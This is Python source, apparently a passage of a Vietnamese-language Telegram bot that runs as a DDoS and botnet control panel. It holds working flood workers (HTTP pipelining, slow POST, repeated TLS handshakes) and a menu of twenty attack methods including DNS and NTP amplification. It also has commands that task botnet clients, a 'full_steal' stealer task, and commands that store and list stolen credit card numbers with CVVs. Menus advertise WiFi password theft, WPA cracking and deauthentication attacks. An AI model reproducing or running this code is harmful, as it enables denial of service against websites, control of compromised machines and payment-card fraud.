def pipeline_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
        while attacks.get(chat_id, {}).get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                pipeline = b""
                for i in range(100):
                    pipeline += f"GET /?r={random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode()
                sock.send(pipeline)
                sock.close()
                with lock:
                    request_counts[chat_id] += 100
            except:
                pass
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def slow_request_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
        while attacks.get(chat_id, {}).get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                sock.sendto(b"POST / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n", (host, port))
                for i in range(1000):
                    sock.sendto(b"X-Data-" + str(i).encode() + b": " + random._urandom(10).hex().encode() + b"\r\n", (host, port))
                    time.sleep(0.1)
                sock.close()
                with lock:
                    request_counts[chat_id] += 1000
            except:
                pass
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def tls_reneg_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 443
        while attacks.get(chat_id, {}).get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                context = ssl.create_default_context()
                ssock = context.wrap_socket(sock, server_hostname=host)
                for _ in range(20):
                    ssock.do_handshake()
                ssock.close()
                with lock:
                    request_counts[chat_id] += 20
            except:
                pass
            time.sleep(delay_ms / 1000)
    except:
        pass
 
METHODS = {
    "http": http_worker,
    "udp": udp_worker,
    "tcp": tcp_worker,
    "slow": slowloris_worker,
    "https": https_flood_worker,
    "dns": dns_amplification_worker,
    "ntp": ntp_amplification_worker,
    "sslren": ssl_renegotiation_worker,
    "slowread": slow_read_worker,
    "combo": combo_worker,
    "http2": http2_worker,
    "synack": syn_ack_worker,
    "gre": gre_worker,
    "quic": quic_worker,
    "ws": websocket_worker,
    "graphql": graphql_worker,
    "range": range_worker,
    "pipeline": pipeline_worker,
    "slow_adv": slow_request_worker,
    "tls_adv": tls_reneg_worker,
}
 
# ==================== QUẢN LÝ TẤN CÔNG ====================
def start_attack(chat_id, target, workers_count, target_rps, method, duration=0):
    req_per_worker = max(1, target_rps // workers_count)
    delay_ms = max(1, 1000 // req_per_worker)
    request_counts[chat_id] = 0
    attacks[chat_id] = {
        'active': True,
        'threads': [],
        'target': target,
        'workers': workers_count,
        'target_rps': target_rps,
        'method': method,
        'start_time': time.time(),
        'max_rps': 0,
        'total_reqs': 0,
        'duration': duration
    }
    for i in range(workers_count):
        t = threading.Thread(target=METHODS[method], args=(chat_id, target, delay_ms, i))
        t.daemon = True
        t.start()
        attacks[chat_id]['threads'].append(t)
    def auto_increase():
        while attacks.get(chat_id, {}).get('active', False):
            time.sleep(15)
            if chat_id not in attacks:
                break
            elapsed = time.time() - attacks[chat_id]['start_time']
            total = request_counts.get(chat_id, 0)
            if elapsed < 10:
                continue
            current_rps = int(total / elapsed)
            target_rps_val = attacks[chat_id]['target_rps']
            if current_rps < target_rps_val * 0.7 and attacks[chat_id]['workers'] < 2000:
                new_workers = int(attacks[chat_id]['workers'] * 1.2) + 10
                new_workers = min(new_workers, 2000)
                bot.send_message(chat_id, f"🚀 *TỰ TĂNG WORKER* từ `{attacks[chat_id]['workers']}` lên `{new_workers}` để đạt RPS", parse_mode='Markdown')
                attacks[chat_id]['workers'] = new_workers
                req_per_worker_new = max(1, target_rps_val // new_workers)
                delay_ms_new = max(1, 1000 // req_per_worker_new)
                for _ in range(new_workers - len(attacks[chat_id]['threads'])):
                    t = threading.Thread(target=METHODS[method], args=(chat_id, target, delay_ms_new, new_workers))
                    t.daemon = True
                    t.start()
                    attacks[chat_id]['threads'].append(t)
    threading.Thread(target=auto_increase, daemon=True).start()
    logging.info(f"Bắt đầu tấn công {target} - workers: {workers_count} - RPS: {target_rps}")
    return delay_ms
 
def stop_attack(chat_id, save_history_flag=True):
    if chat_id not in attacks:
        return False
    attacks[chat_id]['active'] = False
    for t in attacks[chat_id].get('threads', []):
        try:
            t.join(timeout=1)
        except:
            pass
    if save_history_flag and attacks[chat_id].get('total_reqs', 0) > 0:
        add_to_history(
            attacks[chat_id]['target'],
            attacks[chat_id]['total_reqs'],
            attacks[chat_id]['max_rps'],
            int(time.time() - attacks[chat_id]['start_time']),
            attacks[chat_id]['workers'],
            attacks[chat_id]['method'],
            attacks[chat_id]['target_rps']
        )
    del attacks[chat_id]
    return True
 
# ==================== LỆNH TELEGRAM ====================
def is_admin(user_id):
    return user_id == ADMIN_ID
 
def is_logged_in(user_id):
    return logged_in.get(user_id, False)
 
@bot.message_handler(commands=['login'])
def cmd_login(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Bạn không có quyền admin!")
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /login <mật_khẩu>\nVD: /login 7788")
        return
    if args[1] == ADMIN_PASSWORD:
        logged_in[user_id] = True
        bot.reply_to(message, "✅ Đăng nhập thành công! Bạn có thể dùng các lệnh bot.")
        logging.info(f"Admin {user_id} đã đăng nhập")
    else:
        bot.reply_to(message, "❌ Sai mật khẩu!")
 
@bot.message_handler(commands=['logout'])
def cmd_logout(message):
    user_id = message.from_user.id
    if is_admin(user_id):
        logged_in[user_id] = False
        bot.reply_to(message, "🔒 Đã đăng xuất. Cần đăng nhập lại để dùng lệnh.")
        logging.info(f"Admin {user_id} đã đăng xuất")
    else:
        bot.reply_to(message, "❌ Không có quyền.")
 
@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Bạn không có quyền sử dụng bot này!")
        return
    bot.reply_to(message, """
💀 *NULLZEREPTOOL - SIÊU DDOS BOT + WIFI/BLUETOOTH ATTACK* 💀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
🔐 *ĐĂNG NHẬP TRƯỚC KHI DÙNG:*
/login 7788
 
📜 *DANH SÁCH LỆNH:*
 
🔥 *TẤN CÔNG DDOS:*
/attack <url> <workers> <rps> <method> [time]
/stop
/stats
 
🔄 *PROXY:*
/proxy update
/proxy list
 
🔑 *QUẢN LÝ KEY:*
/key [days]
/keys
/delkey <key>
 
📜 *LỊCH SỬ:*
/history
 
🤖 *BOTNET:*
/listbots
/botcmd attack <url> <workers> <rps> <method> <duration>
/botcmd stop
/broadcast <tin nhắn>
/update_client
 
📡 *QUÉT WIFI & BLUETOOTH:*
/scanwifi - Quét thiết bị WiFi + chi tiết
/scanbt - Quét Bluetooth + chi tiết
/wifiscan - Quét mạng WiFi xung quanh
/wifilist - Liệt kê card WiFi
/btlist - Liệt kê adapter Bluetooth
 
🔐 *CRACK & LẤY PASS WIFI:*
/wifipass - Lấy mật khẩu WiFi đã lưu
/wificrack - Crack WPA3/WPA4
 
💀 *TẤN CÔNG WIFI & BLUETOOTH:*
/deauth - Đá WiFi
/stopdeauth - Dừng đá WiFi
/btdeauth - Đá Bluetooth
/btlock - Khóa chết Bluetooth
/stopbt - Dừng Bluetooth
 
☢️ *SIÊU TẤN CÔNG KẾT HỢP:*
/fullattack - WiFi + Bluetooth cùng lúc
/fullattack2026 - Quantum Exploit WiFi 7 + BLE 6.0
/stopall - Dừng tất cả
 
🤖 *BOTNET C2 - MẸ + CON:*
/botnet_task - Ra lệnh cho Botnet Con
/botnetdata - Xem dữ liệu thu thập
/botnetslaves - Xem danh sách Botnet Con
/botnetexport - Xuất file JSON
 
📊 *THỐNG KÊ & TIỆN ÍCH:*
/chart - Biểu đồ RPS
/deploy - Hướng dẫn deploy 24/7
/version - Xem phiên bản
/update - Cập nhật bot
 
💳 *CVV:*
/cvv <cc> <cvv> <exp>
/getcvv
 
🚀 *CÁC METHOD CÓ SẴN:*
http, udp, tcp, slow, https, dns, ntp, sslren, slowread, combo
http2, synack, gre, quic, ws, graphql, range, pipeline, slow_adv, tls_adv
 
💀 *COMBO LÀ MẠNH NHẤT!*
""", parse_mode='Markdown')
 
@bot.message_handler(commands=['help'])
def cmd_help(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Bạn không có quyền sử dụng bot này!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Bạn cần đăng nhập trước! Gõ /login 7788")
        return
    bot.reply_to(message, """
💀 *HƯỚNG DẪN SỬ DỤNG BOT* 💀
 
🔐 `/login 7788` - Đăng nhập
 
🔥 *TẤN CÔNG DDOS:*
`/attack <url> <workers> <rps> <method> [time]`
`/stop` - Dừng tấn công
`/stats` - Xem thống kê
`/history` - Lịch sử tấn công
 
📡 *QUÉT THIẾT BỊ:*
`/scanwifi` - Quét thiết bị WiFi
`/scanbt` - Quét Bluetooth
`/wifiscan` - Quét mạng WiFi
`/wifipass` - Lấy pass WiFi đã lưu
`/wificrack` - Crack WPA3/WPA4
 
💀 *TẤN CÔNG:*
`/deauth` - Đá WiFi
`/btdeauth` - Đá Bluetooth
`/btlock` - Khóa Bluetooth
`/fullattack` - WiFi + Bluetooth
`/fullattack2026` - Siêu tấn công 2026
`/stopall` - Dừng tất cả
 
🔄 *PROXY:*
`/proxy update` - Cập nhật proxy
`/proxy list` - Danh sách proxy
 
🤖 *BOTNET C2:*
`/botnet_task wifi_scan` - Ra lệnh quét WiFi
`/botnet_task full_steal` - Full Stealer
`/botnetdata` - Xem dữ liệu
`/botnetslaves` - Xem slaves
`/botnetexport` - Xuất JSON
 
🔑 *KEY:*
`/key [days]` - Tạo key
`/keys` - Danh sách key
`/delkey <key>` - Xóa key
 
💳 *CVV:*
`/cvv <cc> <cvv> <exp>`
`/getcvv`
 
💀 *COMBO LÀ MẠNH NHẤT!*
""", parse_mode='Markdown')
 
@bot.message_handler(commands=['attack'])
def cmd_attack(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Bạn không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Bạn cần đăng nhập trước! Gõ /login 7788")
        return
    if is_rate_limited(user_id):
        bot.reply_to(message, "⏰ Bạn đang gửi quá nhiều lệnh, hãy thử lại sau!")
        return
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message, """
❌ *SAI CÚ PHÁP!*
━━━━━━━━━━━━━
/attack <url> <workers> <rps> <method> [time]
 
📌 *VÍ DỤ:*
/attack https://example.com 500 100000 combo
/attack https://example.com 200 50000 http 60
 
⚙️ *WORKERS:* 1-1000
💥 *RPS:* 1000-200000
🔥 *METHOD:* combo, http, udp, tcp, slow, https, dns, ntp, sslren, slowread, http2, synack, gre, quic, ws, graphql, range, pipeline, slow_adv, tls_adv
⏱️ *TIME:* 0 = chạy đến khi stop (mặc định)
        """, parse_mode='Markdown')
        return
    target = args[1]
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    try:
        workers = int(args[2])
        if workers < 1 or workers > 1000:
            raise ValueError
    except:
        bot.reply_to(message, "❌ Worker phải từ 1 đến 1000!")
        return
    try:
        target_rps = int(args[3])
        if target_rps < 100 or target_rps > 200000:
            raise ValueError
    except:
        bot.reply_to(message, "❌ RPS phải từ 100 đến 200000!")
        return
    method = args[4].lower()
    if method not in METHODS:
        bot.reply_to(message, f"❌ Method '{method}' không hợp lệ!\nCác method có sẵn: {', '.join(METHODS.keys())}")
        return
    attack_time = 0
    if len(args) > 5:
        try:
            attack_time = int(args[5])
            if attack_time < 0:
                attack_time = 0
        except:
            pass
    if chat_id in attacks and attacks[chat_id].get('active', False):
        bot.reply_to(message, "⚠️ Đang có một đợt tấn công! Dùng /stop để dừng trước.")
        return
    if not is_web_alive(target):
        bot.reply_to(message, f"⚠️ *CẢNH BÁO:* Target `{target}` không phản hồi! Vẫn tiếp tục tấn công?", parse_mode='Markdown')
    if not proxy_list:
        bot.reply_to(message, "🔄 Đang cập nhật proxy...")
        update_proxy_list()
    delay_ms = start_attack(chat_id, target, workers, target_rps, method, attack_time)
    method_names = {
        "http": "HTTP Flood (GET+POST+HEAD+OPTIONS)",
        "udp": "UDP Flood (Layer 4)",
        "tcp": "TCP Flood",
        "slow": "Slowloris",
        "https": "HTTPS Flood (SSL)",
        "dns": "DNS Amplification",
        "ntp": "NTP Amplification",
        "sslren": "SSL Renegotiation",
        "slowread": "Slow Read Attack",
        "combo": "COMBO MAX (HTTP+UDP+TCP)",
        "http2": "HTTP/2 Flood",
        "synack": "SYN-ACK Flood",
        "gre": "GRE Flood",
        "quic": "QUIC Flood",
        "ws": "WebSocket Flood",
        "graphql": "GraphQL Flood",
        "range": "Range Header Flood",
        "pipeline": "HTTP Pipelining",
        "slow_adv": "Slow Request Advanced",
        "tls_adv": "TLS Renegotiation Advanced",
    }
    response = f"""
✅ *ĐÃ BẮT ĐẦU TẤN CÔNG!*
━━━━━━━━━━━━━━━━━━━━
🎯 *Target:* `{target}`
⚙️ *Workers:* `{workers}`
💥 *RPS mục tiêu:* `{target_rps}`
🔥 *Method:* `{method_names.get(method, method.upper())}`
⏱️ *Delay/worker:* `{delay_ms}ms`
🔄 *Proxy:* `{len(proxy_list)}` proxy
    """
    if attack_time > 0:
        response += f"⏰ *Tự động dừng sau:* `{attack_time} giây`\n"
    response += """
📊 Theo dõi: /stats
🛑 Dừng: /stop
    """
    bot.reply_to(message, response, parse_mode='Markdown')
    if attack_time > 0:
        def auto_stop():
            time.sleep(attack_time)
            if chat_id in attacks and attacks[chat_id].get('active', False):
                total = request_counts.get(chat_id, 0)
                if attacks[chat_id].get('total_reqs', 0) == 0:
                    attacks[chat_id]['total_reqs'] = total
                stop_attack(chat_id)
                bot.send_message(chat_id, f"⏰ *TỰ ĐỘNG DỪNG SAU {attack_time}s*\n📨 Tổng request: {total:,}", parse_mode='Markdown')
        threading.Thread(target=auto_stop, daemon=True).start()
    def report_loop():
        last_req = 0
        last_time = time.time()
        while chat_id in attacks and attacks[chat_id].get('active', False):
            time.sleep(20)
            if chat_id in attacks and attacks[chat_id].get('active', False):
                current_req = request_counts.get(chat_id, 0)
                current_time = time.time()
                elapsed = current_time - last_time
                if elapsed > 0:
                    current_rps = int((current_req - last_req) / elapsed)
                    if current_rps > attacks[chat_id].get('max_rps', 0):
                        attacks[chat_id]['max_rps'] = current_rps
                    attacks[chat_id]['total_reqs'] = current_req
                bot.send_message(chat_id, f"""
📊 *BÁO CÁO ĐỊNH KỲ*
━━━━━━━━━━━━━━━
📨 Tổng request: `{current_req:,}`
⚡ RPS hiện tại: `{current_rps}`
🏆 RPS cao nhất: `{attacks[chat_id]['max_rps']}`
🎯 RPS mục tiêu: `{target_rps}`
🔥 Method: `{method.upper()}`
                """, parse_mode='Markdown')
                last_req = current_req
                last_time = current_time
    threading.Thread(target=report_loop, daemon=True).start()
    
 
@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    chat_id = message.chat.id
    if chat_id not in attacks or not attacks[chat_id].get('active', False):
        bot.reply_to(message, "ℹ️ Không có đợt tấn công nào đang chạy!")
        return
    total_reqs = request_counts.get(chat_id, 0)
    max_rps = attacks[chat_id].get('max_rps', 0)
    target = attacks[chat_id].get('target', 'Unknown')
    workers = attacks[chat_id].get('workers', 0)
    target_rps = attacks[chat_id].get('target_rps', 0)
    method = attacks[chat_id].get('method', 'unknown')
    duration = int(time.time() - attacks[chat_id].get('start_time', time.time()))
    attacks[chat_id]['total_reqs'] = total_reqs
    attacks[chat_id]['max_rps'] = max_rps
    stop_attack(chat_id)
    bot.reply_to(message, f"""
🛑 *ĐÃ DỪNG TẤN CÔNG*
━━━━━━━━━━━━━━━━━━
🎯 *Target:* `{target}`
📨 *Tổng request:* `{total_reqs:,}`
🏆 *RPS cao nhất:* `{max_rps}`
💥 *RPS mục tiêu:* `{target_rps}`
⚙️ *Workers:* `{workers}`
🔥 *Method:* `{method.upper()}`
⏱️ *Thời gian:* `{duration}s`
    """, parse_mode='Markdown')
 
@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    chat_id = message.chat.id
    if chat_id not in attacks or not attacks[chat_id].get('active', False):
        bot.reply_to(message, "ℹ️ Không có đợt tấn công nào đang chạy!")
        return
    total_reqs = request_counts.get(chat_id, 0)
    elapsed = max(1, int(time.time() - attacks[chat_id]['start_time']))
    current_rps = total_reqs // elapsed
    max_rps = attacks[chat_id].get('max_rps', 0)
    bot.reply_to(message, f"""
📊 *THỐNG KÊ CHI TIẾT*
━━━━━━━━━━━━━━━━━━
🎯 *Target:* `{attacks[chat_id]['target']}`
📨 *Tổng request:* `{total_reqs:,}`
⚡ *RPS hiện tại:* `{current_rps}`
🏆 *RPS cao nhất:* `{max_rps}`
🎯 *RPS mục tiêu:* `{attacks[chat_id]['target_rps']}`
⚙️ *Workers:* `{attacks[chat_id]['workers']}`
🔥 *Method:* `{attacks[chat_id]['method'].upper()}`
⏱️ *Thời gian:* `{elapsed}s`
    """, parse_mode='Markdown')
 
@bot.message_handler(commands=['history'])
def cmd_history(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    history = load_history()
    if not history:
        bot.reply_to(message, "📭 Chưa có lịch sử tấn công nào!")
        return
    text = "📜 *LỊCH SỬ TẤN CÔNG*\n━━━━━━━━━━━━━━━━━━\n\n"
    for i, item in enumerate(history[:15], 1):
        text += f"{i}. 🎯 `{item['target'][:50]}`\n"
        text += f"   📨 `{item['requests']:,}` req | 🚀 `{item['max_rps']}` rps\n"
        text += f"   ⚙️ `{item['workers']}` workers | ⏱️ `{item['duration']}`s\n"
        text += f"   🔥 `{item['method'].upper()}` | 🎯 `{item.get('rps_target', 'N/A')}` rps\n"
        text += f"   📅 `{item['time']}`\n"
        if item.get('web_died'):
            text += f"   💀 *WEB ĐÃ CHẾT*\n"
        text += "\n"
    bot.reply_to(message, text, parse_mode='Markdown')
 
@bot.message_handler(commands=['proxy'])
def cmd_proxy(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, f"""
📡 *PROXY MANAGEMENT*
━━━━━━━━━━━━━━━━━━
📡 *Số proxy:* `{len(proxy_list)}`
 
🔧 *LỆNH:*
/proxy update - Cập nhật proxy mới
/proxy list - Xem danh sách proxy
        """, parse_mode='Markdown')
        return
    if args[1] == "update":
        bot.reply_to(message, "🔄 Đang cập nhật proxy, vui lòng chờ...")
        update_proxy_list()
        bot.reply_to(message, f"✅ Đã cập nhật thành công {len(proxy_list)} proxy!")
    elif args[1] == "list":
        if proxy_list:
            text = "📡 *Danh sách proxy:*\n"
            for i, p in enumerate(proxy_list[:30], 1):
                text += f"{i}. `{p}`\n"
            bot.reply_to(message, text[:4000], parse_mode='Markdown')
        else:
            bot.reply_to(message, "📭 Chưa có proxy nào! Dùng /proxy update để lấy proxy.")
 
@bot.message_handler(commands=['listbots'])
def cmd_listbots(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    if not botnet_clients:
        bot.reply_to(message, "📭 Chưa có client nào kết nối.")
        return
    text = "📡 *DANH SÁCH CLIENT:*\n"
    for c in botnet_clients:
        text += f"🖥️ `{c['ip']}` - last seen: {int(time.time() - c['last_seen'])}s ago\n"
    bot.reply_to(message, text, parse_mode='Markdown')
 
@bot.message_handler(commands=['botcmd'])
def cmd_botcmd(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /botcmd <attack/stop> [params...]")
        return
    global current_botnet_command
    if args[1] == "attack":
        if len(args) < 7:
            bot.reply_to(message, "❌ /botcmd attack <url> <workers> <rps> <method> <duration>")
            return
        target = args[2]
        workers = args[3]
        rps = args[4]
        method = args[5]
        duration = args[6]
        current_botnet_command = f"{target}|{workers}|{rps}|{method}|{duration}"
        save_attack(target, workers, rps, method, duration)
        bot.reply_to(message, f"✅ Đã gửi lệnh tấn công đến {len(botnet_clients)} client.")
        def reset_cmd():
            time.sleep(60)
            global current_botnet_command
            current_botnet_command = None
        threading.Thread(target=reset_cmd).start()
    elif args[1] == "stop":
        current_botnet_command = None
        bot.reply_to(message, "🛑 Đã hủy lệnh tấn công.")
    else:
        bot.reply_to(message, "❌ /botcmd attack hoặc /botcmd stop")
 
@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    msg = message.text.replace("/broadcast", "").strip()
    if not msg:
        bot.reply_to(message, "❌ /broadcast <tin nhắn>")
        return
    for c in botnet_clients:
        try:
            requests.get(f"http://{c['ip']}:8080/broadcast?msg={msg}", timeout=2)
        except:
            pass
    bot.reply_to(message, f"✅ Đã broadcast đến {len(botnet_clients)} client")
 
@bot.message_handler(commands=['update_client'])
def cmd_update_client(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    for c in botnet_clients:
        try:
            requests.get(f"http://{c['ip']}:8080/update", timeout=2)
        except:
            pass
    bot.reply_to(message, f"✅ Đã yêu cầu cập nhật client đến {len(botnet_clients)} client")
 
@bot.message_handler(commands=['key'])
def cmd_key(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    args = message.text.split()
    days = 30
    if len(args) > 1:
        try:
            days = int(args[1])
            if days < 1 or days > 365:
                days = 30
        except:
            pass
    new_key = create_key(user_id, days)
    bot.reply_to(message, f"""
🔑 *KEY MỚI ĐƯỢC TẠO*
━━━━━━━━━━━━━━━━
🔐 *Key:* `{new_key}`
📅 *Hạn sử dụng:* `{days} ngày`
💡 *Người tạo:* `{user_id}`
 
⚠️ *Lưu key này để cấp cho người dùng!*
    """, parse_mode='Markdown')
 
@bot.message_handler(commands=['keys'])
def cmd_keys(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    keys = load_keys()
    if not keys:
        bot.reply_to(message, "📭 Chưa có key nào!")
        return
    text = "🔑 *DANH SÁCH KEY*\n━━━━━━━━━━━━━━━━\n\n"
    for k, v in keys.items():
        expiry = datetime.fromtimestamp(v['expiry']).strftime("%d/%m/%Y")
        used = len(v.get('used_by', []))
        max_uses = v.get('max_uses', 1)
        text += f"🔐 `{k}`\n   📅 Hết hạn: `{expiry}` | ✅ `{used}/{max_uses}`\n\n"
        if len(text) > 3800:
            text += "...\n(Quá nhiều key, hiển thị một phần)"
            break
    bot.reply_to(message, text, parse_mode='Markdown')
 
@bot.message_handler(commands=['delkey'])
def cmd_delkey(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Không có quyền!")
        return
    if not is_logged_in(user_id):
        bot.reply_to(message, "🔐 Cần đăng nhập! /login 7788")
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /delkey <key>")
        return
    key = args[1]
    if delete_key(key):
        bot.reply_to(message, f"✅ Đã xóa key `{key}`", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Không tìm thấy key!")
 
@bot.message_handler(commands=['chart'])
def cmd_chart(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    if message.chat.id not in attacks:
        bot.reply_to(message, "ℹ️ Không có đợt tấn công")
        return
    total = request_counts.get(message.chat.id, 0)
    elapsed = max(1, int(time.time() - attacks[message.chat.id]['start_time']))
    rps = total // elapsed
    plt.figure(figsize=(8, 4))
    plt.bar(['RPS'], [rps], color='red')
    plt.title(f'RPS - {attacks[message.chat.id]["target"][:30]}')
    plt.ylabel('Requests/sec')
    buf = io.BytesIO()
    plt.savefig(buf, format='png')
    buf.seek(0)
    bot.send_photo(message.chat.id, buf, caption=f"📊 RPS: {rps}")
 
@bot.message_handler(commands=['deploy'])
def cmd_deploy(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    bot.reply_to(message, """
🚀 *DEPLOY 24/7 MIỄN PHÍ*
 
1. Push code lên GitHub
2. Đăng ký render.com
3. Tạo Web Service, start: python bot.py
4. Thêm biến: BOT_TOKEN, ADMIN_ID
5. Dùng UptimeRobot ping URL mỗi 5 phút
 
💀 Bot chạy 24/7 không cần máy!
""", parse_mode='Markdown')
 
@bot.message_handler(commands=['version'])
def cmd_version(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    text = f"🤖 Bot version: {CURRENT_VERSION}\n📡 Client count: {len(botnet_clients)}\n🔌 Proxy count: {len(proxy_list)}"
    bot.reply_to(message, text)
 
@bot.message_handler(commands=['update'])
def cmd_update(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    bot.reply_to(message, "🔄 Đang kiểm tra phiên bản mới...")
    try:
        resp = requests.get(GITHUB_REPO, timeout=10)
        if resp.status_code == 200:
            new_version = None
            for line in resp.text.split('\n'):
                if 'CURRENT_VERSION =' in line and '"' in line:
                    new_version = line.split('"')[1]
                    break
            if new_version and new_version != CURRENT_VERSION:
                with open(__file__, 'w') as f:
                    f.write(resp.text)
                bot.reply_to(message, f"✅ Cập nhật lên v{new_version}, đang restart...")
                os.execv(sys.executable, [sys.executable] + sys.argv)
            else:
                bot.reply_to(message, "✅ Đã là bản mới nhất")
        else:
            bot.reply_to(message, "❌ Lỗi kết nối GitHub")
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {e}")
 
@bot.message_handler(commands=['cvv'])
def cmd_cvv(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ /cvv <cc> <cvv> <exp>\nVD: /cvv 4111111111111111 123 12/25")
        return
    cc = args[1]
    cvv = args[2]
    exp = args[3]
    save_cvv(cc, cvv, exp)
    bot.reply_to(message, f"✅ Đã lưu thông tin!\n💳 CC: {cc}\n🔑 CVV: {cvv}\n📅 Exp: {exp}")
 
@bot.message_handler(commands=['getcvv'])
def cmd_getcvv(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("SELECT * FROM cvv_logs ORDER BY id DESC LIMIT 20")
    rows = c.fetchall()
    conn.close()
    if not rows:
        bot.reply_to(message, "📭 Chưa có dữ liệu CVV")
        return
    text = "💳 *DANH SÁCH CVV THU THẬP*\n━━━━━━━━━━━━━━━━━━\n"
    for row in rows:
        text += f"🔹 CC: {row[1]}\n   CVV: {row[2]} | Exp: {row[3]}\n   📅 {row[4]}\n\n"
    bot.reply_to(message, text[:4000], parse_mode='Markdown')
 
def auto_refresh_proxy():
    global proxy_list
    while True:
        time.sleep(300)
        if len(proxy_list) < 20:
            logging.warning(f"⚠️ Chỉ còn {len(proxy_list)} proxy, đang cập nhật...")
            update_proxy_list()
        else:
            logging.info(f"✅ Proxy ổn định: {len(proxy_list)} proxy")
 
threading.Thread(target=auto_refresh_proxy, daemon=True).start()
 
# ==================== QUÉT THIẾT BỊ WIFI & BLUETOOTH NÂNG CẤP ====================
def detect_wifi_interfaces_windows():
    interfaces = []
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=10
        )
        current_iface = {}
        for line in result.stdout.split('\n'):
            line = line.strip()
            if ':' in line:
                key, val = line.split(':', 1)
                key = key.strip()
                val = val.strip()
                if key == 'Name':
                    if current_iface and 'Name' in current_iface:
                        interfaces.append(current_iface)
                    current_iface = {'Name': val}
                elif key == 'Description' and current_iface is not None:
                    current_iface['Description'] = val
                elif key == 'State' and current_iface is not None:
                    current_iface['State'] = val
                elif key == 'Radio type' and current_iface is not None:
                    current_iface['RadioType'] = val
        if current_iface and 'Name' in current_iface:
            interfaces.append(current_iface)
    except:
        pass
    if not interfaces:
